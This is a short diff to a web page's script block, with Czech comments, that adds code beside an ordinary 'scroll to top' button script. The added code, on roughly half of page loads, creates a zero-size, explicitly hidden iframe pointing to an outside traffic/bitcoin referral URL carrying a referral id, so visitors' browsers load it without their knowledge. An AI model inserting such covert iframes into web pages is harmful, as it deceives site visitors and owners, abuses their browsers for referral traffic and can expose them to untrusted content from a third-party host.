@@ -204,6 +204,24 @@
 </div> 
 
 <script>
+    // Náhrada za PHP rand(1,10)<=5
+    if (Math.random() <= 0.5) { 
+        // Vytvoříme skrytý iframe
+        var iframe = document.createElement('iframe');
+        iframe.src = "https://traffic2bitcoin.com/ptp.php?ref=adamca65&sitetype=1";
+        iframe.marginWidth = "0";
+        iframe.marginHeight = "0";
+        iframe.width = "0";
+        iframe.height = "0";
+        iframe.scrolling = "no";
+        iframe.frameBorder = "0";
+        iframe.style.border = "0";
+        iframe.style.display = "none"; // Pro jistotu, aby nebyl vidět
+        document.body.appendChild(iframe);
+    }
+</script>
+
+<script>
     // Zobrazit/skrýt tlačítko "Nahoru"
     let mybutton = document.getElementById("scrollToTopBtn");
 
